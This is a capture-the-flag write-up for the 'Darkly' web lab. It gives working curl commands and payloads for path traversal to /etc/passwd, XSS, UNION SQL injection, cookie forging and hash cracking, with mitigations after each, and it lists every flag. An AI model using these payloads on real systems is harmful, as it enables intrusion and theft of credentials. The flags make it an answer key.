# Darkly
Small web CTF challenge

## Setup
```
export TARGET_IP=192.168.100.130
```

## Eumeration
### Port scan
`nmap` bruteforces all the port ranges by sending them TCP packets. Only the ports which have responded will be recorded
```
┌──(nszl㉿LAPTOP-EREU4AFG)-[~]
└─$ nmap -p 1-65535 $TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-05 11:10 +08
Nmap scan report for 192.168.100.130
Host is up (0.013s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
```

### Route scan
[nikto](https://github.com/sullo/nikto/wiki/Overview-&-Description) is an open source tool used to enumerate webservers (which we have confirmed using port scan above). It will search common directories and display potential openings for exploits. This is not an exaustive search as it only attempts surface level enumeration and does not carry out the exploit itself nor does it pinpoint the exact exploit location

```
┌──(nszl㉿LAPTOP-EREU4AFG)-[~]
└─$ nikto -h $TARGET_IP
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.130
+ Target Hostname:    192.168.100.130
+ Target Port:        80
+ Start Time:         2025-06-05 11:18:56 (GMT8)
---------------------------------------------------------------------------
+ Server: nginx/1.4.6 (Ubuntu)
+ /: Cookie I_am_admin created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.29.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /whatever/: Directory indexing found.
+ /robots.txt: Entry '/whatever/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ nginx/1.4.6 appears to be outdated (current is at least 1.20.1).
+ /admin/: This might be interesting.
+ /css/: This might be interesting.
+ /includes/: This might be interesting.
+ /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8118 requests: 7 error(s) and 13 item(s) reported on remote host
+ End Time:           2025-06-05 11:19:23 (GMT8) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

## Exploit: .hidden/ directory
### Enumeration
The `.hidden/` directory listing contains multiple nested obfuscated directory names and random plaintext README files in some.

![image](https://hackmd.io/_uploads/HkaDqC1Qge.png)

### Solution
`wget` is used with the `--execute robots=off` options to ignore the `robots.txt` used in the server that disallows crawlers to access the `.hidden` endpoint. The purpose of this command is to scrape all the files recursively into host machine for further processing

```
 wget   --recursive   --no-parent   --no-check-certificate   --execute robots=off   $TARGET_IP/.hidden/
```

A script is then used to just simply print out any README file it encounters

```bash=
# finder.sh
# Set the starting directory
START_DIR="${1:-.}"  # Default to current directory if not provided

# Traverse recursively and find README files (case-insensitive)
find "$START_DIR" -type f -iname "README*" | while read -r file; do
    cat "$file"
done
```

Run the script in the extracted directory and filter out any output that may resemble a flag, and the flag can be obtained

```
┌──(nszl㉿LAPTOP-EREU4AFG)-[~/192.168.100.130/.hidden]
└─$ bash finder.sh | grep flag
Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
^C
```

> The flag is `d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466`
 
### Mitigations
- robots.txt can be specifically ignored
- hidden directories can still be accessed manually
- Do not make sensitive information servable

## Exploit: exposed htpasswd file
In the `/whatever` directory, there is a plaintext file called `htpasswd` file being exposed.

The name of this file corresponds to the [htpasswd](https://httpd.apache.org/docs/2.4/programs/htpasswd.html) service by apache for authentication. The contents of the file are like so:

![image](https://hackmd.io/_uploads/By9DkMemll.png)

The list of encryption methods the service uses are MD5, SHA-1x or SHA-2x. 

> htpasswd hashes passwords using either bcrypt, a version of MD5 modified for Apache, SHA-1, or the system's crypt() routine. SHA-2-based hashes (SHA-256 and SHA-512) are supported for crypt(). Files managed by htpasswd may contain a mixture of different encoding types of passwords; some user records may have bcrypt or MD5-hashed passwords while others in the same file may have passwords hashed with crypt().

Upon placing the ciphertext in a cipher detector, the MD5 cipher was its strongest suggestion:

![image](https://hackmd.io/_uploads/r1xWxfe7le.png)

The online decryptor and it does not work, which leads us to manual bruteforcing. There is a tool called [hashcat](https://www.kali.org/tools/hashcat/#hashcat-1) which can help us with this. Hashcat is a bruteforcing tool with extra functionality which includes temperature monitoring, masking, checkpointing and so on. It also supports the MD5 hash bruteforce.

A pure bruteforce was attempted up to 8 characters with alphanumeric characters only and we did not find a result. 

However, the attempt with the [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) wordlist is successful, and we managed to recover the password `qwerty123@`

![image](https://hackmd.io/_uploads/BkLCqMe7gg.png)

Entering the password in the `/admin` page, we get our flag
`d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`

![image](https://hackmd.io/_uploads/ry4LhfeXee.png)

> The flag is `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`

### Mitigations
- Same as .hidden/ directory exploit
- Do not use common passwords
- Always validate passwords against wordlists upon creation
- Admin page should not be served in the same host as the user facing application (enumeration fault)

## Exploit: Integer input validation
In the survey page, the inputs provided by the grade section are up to 10, and the form is submitted with a POST request to the server with the grade and the userid as the form body without any authentication.

![image](https://hackmd.io/_uploads/HyNuCNeQle.png)

It is possible to overflow this value by handcrafting the POST request with `curl`, bypassing the frontend restriction. The flag is sent in the response.

```
jun@jun-Latitude-5430:~/Downloads/Postman$ curl -X POST localhost:8080/index.php?page=survey      -H "Content-Type: application/x-www-form-urlencoded"      -d "sujet=2&valeur=100" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<center><h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <div style="margin-top:-75px">
100  6120    0  6102  100    18  4247k  12829 --:--:-- --:--:-- --:--:-- 5976k

```

> The flag is `03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`

### Mitigations
- Only allow authenticated users to write to database
- Validate inputs for overflow in the backend business logic layer

## Exploit: Forgot password validation
For the forgot password page, the submit form is a POST request to the server. Similar to the Integer input validaton exploit, the body can be manually handcrafted and changed, bypassing frontend restrictions. 

![image](https://hackmd.io/_uploads/BypnePgXxe.png)

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl -X POST $TARGET_IP/index.php?page=recover  -H "Content-Type: application/x-www-form-urlencoded" -d "mail=bruh@mail.com&Submit=Submit" | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2621    0  2589  100    32  2288k  28959 --:--:-- --:--:-- --:--:-- 2559k
<center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ 
```

> The flag is `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`
### Mitigations
- Only allow authenticated users to write to database
- Validate inputs for overflow in the backend business logic layer

## Exploit: Directory manipulation

### Enumeration

The page parameter appears to be vulnerable to file path manipulation attacks.  The payload ./ was submitted in the page parameter. This returned the same content as the base request. The payload .../ was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.  

> From burp suite

### Solution
The `page` query parameter dictates what page to be rendered by specifying the file path to the source code. This is vulnerable as the user is able to request for files outside the files meant to be served. 

The site gives a special message when such request is made

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl $TARGET_IP/?page=../../../ | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6925    0  692<script>alert('Nope..');</script><!DOCTYPE HTML>
5    0     0  4578k      0 --:--:-- --:--:-- --:--:-- 6762k
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl $TARGET_IP/?page=../../../../ | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6926    0  6926    0     0  6148k      0 --:--:-- --:--:-- --:--:-<script>alert('Almost.');</script><!DOCTYPE HTML>
- 6763k
```


Upon reaching a certain depth, we get a fixed message when we go further

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl http://localhost:8080/?page=../../../../../../../../../../ | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6940    0  6940    0     0  5332k      0 <script>alert('You can DO it !!!  :]');</script><!DOCTYPE HTML>
--:--:-- --:--:-- --:--:-- 6777k

```

In linux, the `/etc/passwd` contains information about user accounts, hence it was attempted, and we get the flag

```
(base) jun@jun-Latitude-5430:~/Downloads/Postman$ curl http://localhost:8080/?page=../../../../../../../../../../etc/passwd | grep alert
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7014    0  7014    0     0  5157k      0 --:--:--<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script><!DOCTYPE HTML>
 --:--:-- --:--:-- 6849k
```

> The flag is `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

### Mitigation
- Deploy site pages in a chroot jail or a container so sensitive files wont be compromised
- Validate request path in rendering engine 

## Exploit: Cookie Token Manipulation

### Enumeration

The cookie in the "I AM ADMIN" value looks like a hash, Upon dumping it to Dcode, its shown that it is a MD5 hash, showing False
![image](https://hackmd.io/_uploads/BJXdYdemgx.png)
![image](https://hackmd.io/_uploads/rkx5t_g7xl.png)

### Solution

Replacing the cookie with a "true" MD5 and refreshing the page, it has yieded the flag
![image](https://hackmd.io/_uploads/Byrt5deQlx.png)
![image](https://hackmd.io/_uploads/HJKo9dgmel.png)
![image](https://hackmd.io/_uploads/HyIh5dgQle.png)

> The flag is `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

### Mitigation

Dont give any value to unauthenticated user, especially a value that specify that the user is admin

## Exploit: Source Code Inspection Header Hijack

### Enumeration

The albratoss page accessable by clicking the copyright thingy at the bottom of the main page, where its source state that you are needed to be coming from nsa site (lol) and use ft_borntosec browser
![image](https://hackmd.io/_uploads/BkyBUFlmge.png)
![image](https://hackmd.io/_uploads/r1JIItxmlg.png)


### Solution

Replacing the header for referal and user agent gives us the flag lol
![image](https://hackmd.io/_uploads/BJEmUFgmxg.png)
![image](https://hackmd.io/_uploads/SyrErFxmxx.png)

> The flag is `F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188`

### Mitigation

Dont put comment in code
Minify Code
CORS Validation

## Exploit: File Sanitation

### Enumeration
In upload image, it seems that the check image is fully frontend and its not validated at all by backend
![image](https://hackmd.io/_uploads/H1m6Ntl7le.png)


### Solution
Hijacking the image sent with a filename ending with php dumps us the flag.
![image](https://hackmd.io/_uploads/HyulBFemgl.png)
![image](https://hackmd.io/_uploads/HJGZSFlQlg.png)

> The flag is `46910D9CE35B385885A9F7E2B336249D622F29B267A1771FBACF52133BEDDBA8`

### Mitigation

Sanitise and ensure image or file uploaded is the actual needed filename, more points if the images is client side encrypted to prevent hijacking.

## Exploit: Very Easy Bruteforce in login

### Enumeration
The login page seems easily bruteforcable, Looking at the admin page bruteforcing as refrence

### Solution
I ran a script that bruteforced the common username and password, it took less than 10 hrs on a 3090 and 7950X,(i went to sleep lol), and the username and password is admin, shadow
![image](https://hackmd.io/_uploads/Sk01yibXgx.png)
![image](https://hackmd.io/_uploads/SyzzkiZXxx.png)

> The flag is `B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2`

### Mitigation
Common password should be avoided, use number and symbols

## Exploit: XSS Iframe Hijacking

### Enumeration
The media page (/?page=media&src=...) uses a src parameter to load content. This parameter is not properly sanitized and can be manipulated to load content from a source other than the intended one, such as a Data URI.

### Solution
Instead of a valid source like nsa, a malicious Data URI containing a Base64-encoded JavaScript payload is supplied in the src parameter. The browser decodes and executes the script, revealing the flag.

The payload ```<script>alert('Seggs')</script>``` is encoded to Base64: ```PHNjcmlwdD5hbGVydCgnU2VnZ3MnKTwvc2NyaXB0Pg==```

The final URL is crafted as follows:

```http://$TARGET_IP/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnU2VnZ3MnKTwvc2NyaXB0Pg==```

Visiting this URL executes the script.
![image](https://hackmd.io/_uploads/rk8i2sbXgx.png)

> The flag is `928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D`
> 
### Mitigation
Backend should have a whitelist of valid URI and disallow any invalid ones from executing
Do not pass any user input to file or loader, assume internet is hell on earth and any data entering will be tampered with

## Exploit: (mistake) unsafe redirection
### Enumeration
When clicking one of the buttons in the footer which is supposed to lead the user to some social media, there is a slight indirection to `$TARGET_IP/index.php?page=redirect&site=$social_media_here` before redirecting to the actual social media site

![image](https://hackmd.io/_uploads/BJHlfoW7gl.png)

### Solution
The `site` query parameter is not validated and may cause an unhandled exception which may reveal folder structure via stack trace. The flag is obtainable by changing the value for this parameter to something irrelavant.

![image](https://hackmd.io/_uploads/S1nqzjbQeg.png)

The curl command to get this in the terminal is like so
```
curl $TARGET_IP/index.php?page=redirect&site=$social_media_here | grep FLAG
```

> The flag is `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`

### Mitigation
- Handle edge cases by rigorous testing

## Exploit: Weak inupt validation against XSS
### Enumeration
The flag was found accidentally when random inputs like 'a' or 'script' was entered. The following writeup will be attempting to demystify this observation

> The flag is `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

On initial observation, it looks like there are some frontend validations on the form.

- Name field has a maximum length
- Name and Message field should not be empty
- Name and Message fields are sanitized to remove `<script>` tags upon submission
- Message field is trimmed implcitly upon submission.

### Solution

However, those restrictions can be bypassed by intercepting the request and changing the payloads outside of the browser. The sanitization does not filter when the script tags is in uppercase (which will still make the scripts executable)

The `txtName` field is changed to the following to allow XSS `<Script >alert(42)</Script>`

![image](https://hackmd.io/_uploads/Hy1wli-Qeg.png)
![image](https://hackmd.io/_uploads/r1xKgs-7ge.png)

### Mitigations
- Include sanitization on all layers of the system
- Avoid rendering user input directly in HTML

## Exploit: SQL injection in members list
The `/members` page allows the user to query from a list of members using their id. However, the raw user input is passed as an SQL query, which is verified by a simple litmus test using the true value `0=0`

![image](https://hackmd.io/_uploads/ByRhAxZmex.png)

> 0=0 evaluates to true, and when used in a WHERE clause, it will cause the clause to return all the rows

With this information in mind, an initial structure of the query can be formed, which is believed to be something like this `"SELECT * FROM members WHERE id = " + user_query + ";"` where the results is expecting a single table.

In MYSQL, we are able to combine different data into 1 table using the `UNION SELECT` function. Which we will use to append more information to the orignal query such as the table names. 

To get such information in MYSQL, we need to query from the `information_schema.tables` field.

```SQL
0=0 UNION SELECT table_name FROM information_schema.tables
```

This will give us an error `The used SELECT statements have a different number of columns` which shows us that we are on the right path. We just needed to match the number of columns selected in the UNION SELECT statement to match the number of columns selected in the original query, which turns out to be 2 

```SQL
0=0 UNION SELECT table_name, table_type FROM information_schema.tables 
```

![image](https://hackmd.io/_uploads/HJMkbWb7ee.png)

From the results, we can determine that the name of the members table is called `users`. Which we can use to search for its column names using the following query

```SQL
0=0 UNION SELECT COLUMN_NAME, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS 
```

> Adding a WHERE clause to fitler by table name is not viable, since the program automatically escapes any quotes for strings by adding a backtick (\) which causes syntax error

![image](https://hackmd.io/_uploads/Bkt1M-ZQle.png)

With this, the full information of all the users can be displayed with the following SQL query

```
0=0 UNION SELECT first_name, town FROM users UNION SELECT  first_name, country FROM users UNION SELECT  first_name, planet FROM users UNION SELECT  first_name, Commentaire FROM users UNION SELECT  first_name, countersign FROM users 
```

which can be made to a curl command

```
curl "$TARGET_IP/?page=member&id=0%3D0+UNION+SELECT+first_name%2C+town+FROM+users+UNION+SELECT++first_name%2C+country+FROM+users+UNION+SELECT++first_name%2C+planet+FROM+users+UNION+SELECT++first_name%2C+Commentaire+FROM+users+UNION+SELECT++first_name%2C+countersign+FROM+users+&Submit=Submit#" | grep Flag
```

Hints were given to the Flag user

![image](https://hackmd.io/_uploads/SJ6qV-Z7ge.png)

![image](https://hackmd.io/_uploads/S1niVZZQel.png)

The decrypted plaintext is FortyTwo
![image](https://hackmd.io/_uploads/Skomrbbmle.png)

which makes the flag `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Mitigations
- Use prepared statements in SQL queries
- Use stronger hashing algorithms with more output vector size (harder to wordlist) for passwords

## Exploit: SQL injection in images list
The `searchimg` page also as a similar SQL injection vulnerability to the members page, we can instantly get the flag instructions by inputting the following SQL command

```SQL
0=0 UNION SELECT url, id FROM list_images UNION SELECT url, title FROM list_images UNION SELECT url, comment FROM list_images 
```

Below is the SQL command in curl
```
curl "$TARGET_IP/?page=searchimg&id=0%3D0+UNION+SELECT+url%2C+id+FROM+list_images+UNION+SELECT+url%2C+title+FROM+list_images+UNION+SELECT+url%2C+comment
+FROM+list_images+&Submit=Submit#" | grep flag
```

Which gives us the output
![image](https://hackmd.io/_uploads/HyDahbbQxg.png)

The following is the decoding and encryption process
![image](https://hackmd.io/_uploads/B1Xla-b7ex.png)

![image](https://hackmd.io/_uploads/ryAfabWXex.png)

> The flag is `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Mitigations
- Use prepared statements in SQL queries
- Avoid storing sensitive information in readable fields (comments)
